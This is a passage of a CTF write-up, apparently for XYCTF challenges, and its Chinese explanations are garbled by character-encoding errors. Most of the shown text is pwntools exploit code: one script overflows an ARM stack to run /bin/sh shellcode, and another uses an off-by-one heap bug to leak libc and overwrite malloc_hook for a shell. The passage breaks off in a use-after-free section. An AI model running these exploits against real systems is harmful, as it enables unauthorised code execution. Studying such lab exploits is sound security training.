sla <span class="token operator">=</span> <span class="token keyword">lambda</span> n<span class="token punctuation">,</span>s <span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>n<span class="token punctuation">,</span>s<span class="token punctuation">)</span>
rc <span class="token operator">=</span> <span class="token keyword">lambda</span> n <span class="token punctuation">:</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>n<span class="token punctuation">)</span>
rl <span class="token operator">=</span> <span class="token keyword">lambda</span>  <span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
ru <span class="token operator">=</span> <span class="token keyword">lambda</span> s <span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>s<span class="token punctuation">)</span>
ra <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvall<span class="token punctuation">(</span><span class="token punctuation">)</span>
ia <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token punctuation">:</span> p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
uu32 <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span> u32<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">b&#39;\x00&#39;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
uu64 <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span> u64<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b&#39;\x00&#39;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
bss <span class="token operator">=</span> elf<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;bss:&quot;</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>bss<span class="token punctuation">)</span><span class="token punctuation">)</span>
ru<span class="token punctuation">(</span><span class="token string">b&quot;welcome XYCTF arm world\n&quot;</span><span class="token punctuation">)</span>
sd<span class="token punctuation">(</span><span class="token string">b&quot;a&quot;</span><span class="token operator">*</span><span class="token number">0x40</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>bss<span class="token operator">+</span><span class="token number">0x100</span><span class="token operator">+</span><span class="token number">0x44</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x10588</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
shellcode  <span class="token operator">=</span> <span class="token string">b&quot;\x02\x20\x42\xe0\x1c\x30\x8f\xe2&quot;</span>
shellcode <span class="token operator">+=</span> <span class="token string">b&quot;\x04\x30\x8d\xe5\x08\x20\x8d\xe5&quot;</span>
shellcode <span class="token operator">+=</span> <span class="token string">b&quot;\x13\x02\xa0\xe1\x07\x20\xc3\xe5&quot;</span>
shellcode <span class="token operator">+=</span> <span class="token string">b&quot;\x04\x30\x8f\xe2\x04\x10\x8d\xe2&quot;</span>
shellcode <span class="token operator">+=</span> <span class="token string">b&quot;\x01\x20\xc3\xe5\x0b\x0b\x90\xef&quot;</span>
shellcode <span class="token operator">+=</span> <span class="token string">b&quot;/bin/sh&quot;</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;shellcode:&quot;</span><span class="token punctuation">,</span>shellcode<span class="token punctuation">)</span>
<span class="token comment"># input(&quot;test&quot;)</span>
<span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">&quot;test&quot;</span><span class="token punctuation">)</span>
payload <span class="token operator">=</span> <span class="token string">b&quot;a&quot;</span><span class="token operator">*</span><span class="token number">0x40</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>bss<span class="token operator">+</span><span class="token number">0x100</span><span class="token operator">+</span><span class="token number">0x44</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span> <span class="token number">0x8afc4</span> <span class="token punctuation">)</span><span class="token operator">+</span>shellcode
sd<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
ia<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="one-byte" tabindex="-1"><a class="header-anchor" href="#one-byte" aria-hidden="true">#</a> one_byte</h2><blockquote><p>å†™å…¥chunkçš„æ—¶å€™å¤šå†™äº†ä¸€ä½0 é€ æˆone_byteæ¼æ´</p></blockquote><ul><li><p>é€šè¿‡chunkè¿›å…¥unsortedbinä¸­ç„¶åè¾“å‡º<code>fd</code>å’Œ<code>bk</code>æ³„éœ²libcåœ°å€</p></li><li><p>é€šè¿‡chunkè¿›å…¥tcacheç„¶å mallocå›æ¥ ç„¶åè¾“å‡ºchunkå†…å®¹ æ³„éœ²<code>heap</code>åœ°å€</p></li></ul><h3 id="åŠ«æŒfreechunk" tabindex="-1"><a class="header-anchor" href="#åŠ«æŒfreechunk" aria-hidden="true">#</a> åŠ«æŒfreechunk</h3><ul><li>å› ä¸ºè¿™é¢˜ç”¨çš„ä¸¤ä¸ªå…¨å±€å˜é‡æ¥å­˜å‚¨çš„ä½¿ç”¨æƒ…å†µå’Œchunkåœ°å€ æˆ‘ä»¬ä¸å¤ªæ–¹ä¾¿ä¼ªé€ <code>fake head</code>æ¥å®ç°åŠ«æŒ</li><li>å› ä¸ºå­˜åœ¨off_by_oneæ¼æ´ æˆ‘ä»¬å¯ä»¥åˆ©ç”¨åˆå¹¶æœºåˆ¶ è¿›è¡Œä¿®æ”¹ä¸€äº›å·²ç»è¿›å…¥biné“¾çš„chunk ä¿®æ”¹å…¶fd ç„¶åæˆ‘ä»¬å†é€šè¿‡malloc å°±å¯ä»¥å®ç°mallocä¸‹æ¥ä¸€ä¸ªä»»æ„åœ°å€ è¿™é‡Œæˆ‘ä»¬é€‰æ‹©æ‰“malloc hook</li><li>å¤§è‡´å°±æ˜¯æ„é€ ä¸€ä¸ªæƒ…å†µ:a b c ä¸‰ä¸ªchunk ç„¶åacéƒ½ä¸º<code>unsortedbin chunk</code> bä¸º<code>fastbin chunk</code>ç„¶åè®©acè§¦å‘åˆå¹¶æœºåˆ¶ æŠŠbåŒ…å«åœ¨åˆå¹¶åçš„å¤§chunkä¸­ æˆ‘ä»¬å†å°†è¿™ä¸ªå¤§chunk mallocä¸‹æ¥ è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥ä¿®æ”¹b chunkäº†</li></ul><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token keyword">import</span> time

<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token comment"># context(os=&#39;linux&#39;, arch=&#39;mips&#39;,endian=&quot;little&quot;, log_level=&#39;debug&#39;)</span>
<span class="token comment"># context(os=&#39;linux&#39;, arch=&#39;amd64&#39;, log_level=&#39;debug&#39;)</span>
context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">&#39;linux&#39;</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">&#39;amd64&#39;</span><span class="token punctuation">)</span>
context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">&#39;byobu&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;sp&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;-h&#39;</span><span class="token punctuation">]</span>
file_name <span class="token operator">=</span> <span class="token string">&quot;./vuln&quot;</span>
url <span class="token operator">=</span> <span class="token string">&quot;127.0.0.1&quot;</span>
port <span class="token operator">=</span> <span class="token number">65030</span>
<span class="token comment"># elf = ELF(file_name)</span>
<span class="token comment"># p= process(file_name)</span>
<span class="token comment"># p = gdb.debug(file_name,&quot;b *main+34&quot;)</span>
p <span class="token operator">=</span> remote<span class="token punctuation">(</span>url<span class="token punctuation">,</span>port<span class="token punctuation">)</span>

sd <span class="token operator">=</span> <span class="token keyword">lambda</span> s <span class="token punctuation">:</span> p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>s<span class="token punctuation">)</span>
sl <span class="token operator">=</span> <span class="token keyword">lambda</span> s <span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>s<span class="token punctuation">)</span>
sa <span class="token operator">=</span> <span class="token keyword">lambda</span> n<span class="token punctuation">,</span>s <span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>n<span class="token punctuation">,</span>s<span class="token punctuation">)</span>
sla <span class="token operator">=</span> <span class="token keyword">lambda</span> n<span class="token punctuation">,</span>s <span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>n<span class="token punctuation">,</span>s<span class="token punctuation">)</span>
rc <span class="token operator">=</span> <span class="token keyword">lambda</span> n <span class="token punctuation">:</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>n<span class="token punctuation">)</span>
rl <span class="token operator">=</span> <span class="token keyword">lambda</span>  <span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
ru <span class="token operator">=</span> <span class="token keyword">lambda</span> s <span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>s<span class="token punctuation">)</span>
ra <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvall<span class="token punctuation">(</span><span class="token punctuation">)</span>
ia <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token punctuation">:</span> p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
uu32 <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span> u32<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">b&#39;\x00&#39;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
uu64 <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span> u64<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b&#39;\x00&#39;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">recv_menu</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    ru<span class="token punctuation">(</span><span class="token string">b&quot;&gt;&gt;&gt; &quot;</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">debug</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">,</span><span class="token string">&quot;b *main+34&quot;</span><span class="token punctuation">)</span>
    <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">&quot;stop&quot;</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span>size<span class="token punctuation">)</span><span class="token punctuation">:</span>
    recv_menu<span class="token punctuation">(</span><span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span><span class="token string">b&quot;1&quot;</span><span class="token punctuation">)</span>
    ru<span class="token punctuation">(</span><span class="token string">b&quot;[?] please input chunk_idx: &quot;</span><span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    ru<span class="token punctuation">(</span><span class="token string">b&quot;[?] Enter chunk size: &quot;</span><span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;---------------\nadd chunk {}\n---------------&quot;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>
    recv_menu<span class="token punctuation">(</span><span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span><span class="token string">b&quot;2&quot;</span><span class="token punctuation">)</span>
    ru<span class="token punctuation">(</span><span class="token string">b&quot;[?] please input chunk_idx: &quot;</span><span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;---------------\ndelete chunk {}\n---------------&quot;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>
    recv_menu<span class="token punctuation">(</span><span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span><span class="token string">b&quot;4&quot;</span><span class="token punctuation">)</span>
    ru<span class="token punctuation">(</span><span class="token string">b&quot;[?] please input chunk_idx: &quot;</span><span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>
    sd<span class="token punctuation">(</span>content<span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">view</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>
    recv_menu<span class="token punctuation">(</span><span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span><span class="token string">b&quot;3&quot;</span><span class="token punctuation">)</span>
    ru<span class="token punctuation">(</span><span class="token string">b&quot;[?] please input chunk_idx: &quot;</span><span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> rc<span class="token punctuation">(</span>n<span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    add<span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token number">0x100</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    delete<span class="token punctuation">(</span>i<span class="token punctuation">)</span>
<span class="token comment"># 0-7æ˜¯å ç”¨çŠ¶æ€</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    add<span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token number">0x100</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">0x100</span><span class="token punctuation">)</span>
res <span class="token operator">=</span> view<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">0x10</span><span class="token punctuation">)</span>
base_libc <span class="token operator">=</span> u64<span class="token punctuation">(</span>res<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">2019072</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;base_libc:&quot;</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>base_libc<span class="token punctuation">)</span><span class="token punctuation">)</span>
res <span class="token operator">=</span> view<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">0x10</span><span class="token punctuation">)</span>
base_heap <span class="token operator">=</span> u64<span class="token punctuation">(</span>res<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1216</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;base_heap:&quot;</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>base_heap<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment"># å¼€å§‹æ„é€ ä¸€ä¸ªchunkå¤„äºfastbinä¸­æƒ…å†µ</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    delete<span class="token punctuation">(</span>i<span class="token punctuation">)</span>
delete<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span>
delete<span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;å ç”¨çš„å·²ç»åˆ é™¤&quot;</span><span class="token punctuation">)</span>
<span class="token comment"># è¦å®ç°tcacheæ»¡ ç„¶åfastbinä¸­å­˜åœ¨</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    add<span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token number">0x78</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">14</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    add<span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token number">0x120</span><span class="token punctuation">)</span>
<span class="token comment"># prev_size size fd bk</span>
chunk_addr <span class="token operator">=</span> base_heap
fakechunk <span class="token operator">=</span> <span class="token string">b&quot;a&quot;</span><span class="token operator">*</span><span class="token number">16</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">721</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>base_heap<span class="token operator">+</span><span class="token number">5696</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>base_heap<span class="token operator">+</span><span class="token number">5696</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>base_heap<span class="token operator">+</span><span class="token number">5664</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">5</span>
add<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">0x20</span><span class="token punctuation">)</span>
<span class="token comment"># åˆå¹¶chunk</span>
add<span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">0x120</span><span class="token punctuation">)</span>
edit<span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">,</span>fakechunk<span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">0x78</span><span class="token punctuation">)</span>
<span class="token comment"># ç”¨äºè¦†å†™</span>
add<span class="token punctuation">(</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">0x138</span><span class="token punctuation">)</span>
<span class="token comment"># ç”¨äºåˆå¹¶</span>
add<span class="token punctuation">(</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">0x120</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">0x20</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    delete<span class="token punctuation">(</span>i<span class="token punctuation">)</span>
delete<span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">)</span>
delete<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span>
<span class="token comment"># delete(1)</span>
delete<span class="token punctuation">(</span><span class="token number">19</span><span class="token punctuation">)</span>
edit<span class="token punctuation">(</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token string">b&quot;a&quot;</span><span class="token operator">*</span><span class="token number">0x130</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">720</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">b&quot;\x30&quot;</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;base_heap:&quot;</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>base_heap<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;base_libc:&quot;</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>base_libc<span class="token punctuation">)</span><span class="token punctuation">)</span>

delete<span class="token punctuation">(</span><span class="token number">18</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;base_heap:&quot;</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>base_heap<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;base_libc:&quot;</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>base_libc<span class="token punctuation">)</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">0x170</span><span class="token punctuation">)</span>
<span class="token comment"># æ„é€ åˆ°malloc hook</span>
edit<span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token string">b&quot;a&quot;</span><span class="token operator">*</span><span class="token number">0x100</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x130</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>base_libc<span class="token operator">+</span><span class="token number">0x1ecb70</span><span class="token operator">-</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;base_heap:&quot;</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>base_heap<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;base_libc:&quot;</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>base_libc<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">21</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    add<span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token number">0x78</span><span class="token punctuation">)</span>
edit<span class="token punctuation">(</span><span class="token number">29</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0xe3b01</span><span class="token operator">+</span>base_libc<span class="token punctuation">)</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">,</span><span class="token number">0x20</span><span class="token punctuation">)</span>
ia<span class="token punctuation">(</span><span class="token punctuation">)</span>

</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="ptmalloc2-its-myheap" tabindex="-1"><a class="header-anchor" href="#ptmalloc2-its-myheap" aria-hidden="true">#</a> ptmalloc2_its_myheap</h2><blockquote><p>è¿™é¢˜åˆ©ç”¨çš„ä¸€ä¸ª<code>head chunk</code>è¿›è¡Œè®°å½•ä¿¡æ¯ ç„¶åä¸€ä¸ª<code>content chunk</code>è®°å½•å†…å®¹ è€Œä¸”æ²¡æœ‰å¯¹<code>content chunk</code>çš„sizeè¿›è¡Œé™åˆ¶</p><p>å¹¶ä¸”æœ€é‡è¦çš„æ˜¯åœ¨freeçš„æ—¶å€™æ²¡æœ‰å¯¹chunkæŒ‡é’ˆè¿›è¡Œæ¸…ç©º è¿™æ ·æˆ‘ä»¬å¯ä»¥å®ç°uaf</p><p>è¾“å‡ºchunkå†…å®¹çš„æ—¶å€™ä¹Ÿæ˜¯æ ¹æ®æˆ‘ä»¬è¾“å…¥çš„sizeæ¥è¿›è¡Œè¾“å‡ºçš„ æ‰€ä»¥å¯ä»¥æ³„éœ²å¤§é‡ä¿¡æ¯</p><p>æœ‰ä¸€ä¸ªgiftå‡½æ•° è¾“å‡ºäº†libcåœ°å€ æˆ‘ä»¬å¯ä»¥ç›´æ¥åŠ«æŒgiftå‡½æ•°å’Œhello_worldå­—ç¬¦ä¸²æ¥å®ç°getshell</p></blockquote><h3 id="åŠ«æŒhead-chunk" tabindex="-1"><a class="header-anchor" href="#åŠ«æŒhead-chunk" aria-hidden="true">#</a> åŠ«æŒhead chunk</h3><blockquote><p>ç”±äºä¿¡æ¯éƒ½æ˜¯é€šè¿‡<code>head chunk</code>è¿›è¡Œçš„è®°å½• æ‰€ä»¥æˆ‘ä»¬ç›´æ¥åŠ«æŒ<code>head chunk</code>å°±å¯ä»¥å®ç°ä»»æ„freeäº† å› ä¸ºåœ¨free <code>head chunk</code>çš„æ—¶å€™ä¼šåŒæ­¥free <code>head chunk</code>è®°å½•çš„bufæŒ‡é’ˆ æˆ‘ä»¬åŠ«æŒ<code>head 